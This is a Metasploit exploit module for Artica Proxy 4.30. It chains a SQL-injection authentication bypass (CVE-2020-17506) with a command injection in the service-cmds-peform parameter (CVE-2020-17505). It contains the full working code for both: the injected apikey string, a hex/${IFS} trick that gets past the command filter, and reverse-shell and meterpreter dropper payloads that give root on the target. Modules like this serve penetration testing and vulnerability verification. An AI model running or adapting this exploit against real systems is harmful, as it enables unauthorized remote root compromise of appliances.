##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Artica proxy 4.30.000000 Auth Bypass service-cmds-peform Command Injection',
        'Description' => %q{
          This module exploits an authenticated command injection vulnerability in Artica Proxy, combined with an authentication bypass
          discovered on the same version, it is possible to trigger the vulnerability without knowing the credentials.
          The application runs in virtual appliance, successful exploitation of this vulnerability yields remote code execution as root on the
          remote system.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'Max0x4141', # discovery
            'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # PoC, msf module
          ],
        'References' =>
          [
            ['CVE', '2020-17505'], # RCE
            ['CVE', '2020-17506'], # Auth bypass
            ['EDB', '48744'],
            ['PACKETSTORM', '158868'],
            ['URL', 'https://blog.max0x4141.com/post/artica_proxy/'],
          ],
        'DefaultOptions' =>
          {
            'SSL' => true,
            'RPort' => 9000
          },
        'Platform' => %w[unix linux],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Targets' => [
          [
            'Unix Command',
            'Platform' => 'unix',
            'Arch' => ARCH_CMD,
            'Type' => :unix_command,
            'DefaultOptions' => {
              'PAYLOAD' => 'cmd/unix/reverse_bash'
            }
          ],
          [
            'Linux Dropper',
            'Platform' => 'linux',
            'Arch' => [ARCH_X86, ARCH_X64],
            'Type' => :linux_dropper,
            'DefaultOptions' => {
              'CMDSTAGER::FLAVOR' => 'wget',
              'PAYLOAD' => 'linux/x64/meterpreter_reverse_tcp'
            }
          ],
          [
            'Authentication bypass',
            'Platform' => 'Linux',
            'Arch' => [ARCH_X86, ARCH_X64],
            'Type' => :auth_bypass,
          ]
        ],
        'Privileged' => true,
        'DisclosureDate' => 'Aug 9 2020',
        'DefaultTarget' => 1,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI of the vulnerable Artica Proxy', '/']),
        OptString.new('PHPSESSID', [false, 'The cookie obtained after successful authentication, if present'])
      ]
    )

    # XXX: https://github.com/rapid7/metasploit-framework/issues/12963
    import_target_defaults
  end

  def check
    @phpsessid = datastore['PHPSESSID'] || auth_bypass
    unless @phpsessid
      fail_with(Failure::NoAccess, "Authentication failed")
    end
    rand_string = Rex::Text.rand_text_alphanumeric(rand(4..16))
    if execute_command("echo${IFS}#{rand_string}").include?(rand_string)
      CheckCode::Appears
    else
      CheckCode::Safe
    end
  end

  def execute_command(cmd, _opts = {})
    # particularity: cmd can't contain spaces, or some characters from a blacklist (+ included for example)
    print_status 'Attempting to gain RCE via CVE-2020-17505'
    # this should bypass the filtering
    cmd = "echo #{Rex::Text.to_hex(cmd, '')}|xxd -r -p|sh".gsub(/ /, '${IFS}')
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'cyrus.index.php'),
      'vars_get' => {
        'service-cmds-peform' => "||#{cmd}||"
      },
      'cookie' => "PHPSESSID=#{@phpsessid}; AsWebStatisticsCooKie=1; shellinaboxCooKie=1"
    })
    res ? res.body : ''
  end

  def auth_bypass
    print_status 'Attempting to bypass authentication via CVE-2020-17506 (SQL injection)'
    apikey = "' UNION select 1,'YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=';"
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'fw.login.php'),
      'vars_get' => {
        'apikey' => apikey
      }
    })
    if res && [200, 301, 302].include?(res.code)
      cookie = res.get_cookies[/PHPSESSID=(.+?);/,1]
      if cookie
        print_good "Got authentication cookie: #{cookie}"
        return cookie
      end
    end
    print_error 'Failed to bypass the authentication via CVE-2020-17506'
    nil
  end

  def exploit
    case target['Type']
    when :unix_command then execute_command(payload.encoded)
    when :linux_dropper then execute_cmdstager
    when :auth_bypass then auth_bypass
    end
  end
end
